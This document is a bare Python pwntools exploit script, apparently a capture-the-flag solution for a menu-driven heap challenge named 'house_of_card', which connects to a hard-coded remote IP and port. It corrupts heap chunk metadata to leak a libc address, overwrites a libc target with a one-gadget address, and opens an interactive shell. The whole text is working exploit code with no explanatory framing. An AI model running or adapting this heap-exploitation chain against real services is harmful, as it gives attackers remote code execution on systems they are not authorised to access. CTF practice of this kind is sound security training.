from pwn import *

#r = process(["./house_of_card"],env={"LD_PRELOAD":"./libc.so"})
r = remote("178.128.87.12", 31336 )
def new(name,size,desc):
	r.sendlineafter("4. Quit","1")
	r.sendlineafter(":",name)
	r.sendlineafter("?",str(size))
	r.sendlineafter(":",desc)


def edit(idx,name,size,desc):
	r.sendlineafter("4. Quit","2")
	r.sendlineafter(">",str(idx))
	r.sendlineafter("?",name)
	r.sendlineafter("?",str(size))
	r.sendline(desc)

def remove(idx):
	r.sendlineafter("4. Quit","3")
	r.sendlineafter(">",str(idx))

new("1",0x100,"a")
new("2",0xe0,"a")
new("3",0xc0,"a")
edit(1,"1",0x101,"a"*0xfc+p64(0x200)+p64(0x130)[:-1])
remove(2)
new("3",0xa0,"a")
r.sendlineafter("4. Quit","2")
r.recvuntil("\x7f")
libc = u64(r.recvn(10)[2:])-0x3c1b58
print hex(libc)
r.sendlineafter(">","4")
for i in range(5):
	new("a"+str(i),0x80,"a")

new("b",0xb0,"a")
target = 0x3c1af0+0x40+libc
edit(4,"a0",0x81,"a"*0x7c+p64(0)+p64(0x21)+p64(target)[:-1])
edit(9,"a"*0x30,0x100,"a")
target = libc+0x3c1af0

edit(4,"a0",0x82,"a"*0x7c+p64(0)+p64(0x21)+p64(target)[:-1])
edit(9,p64(libc+0x4557a),0x100,"a")
print hex(libc+0x4557a)
new("abc",0x100,"ls")
r.interactive()



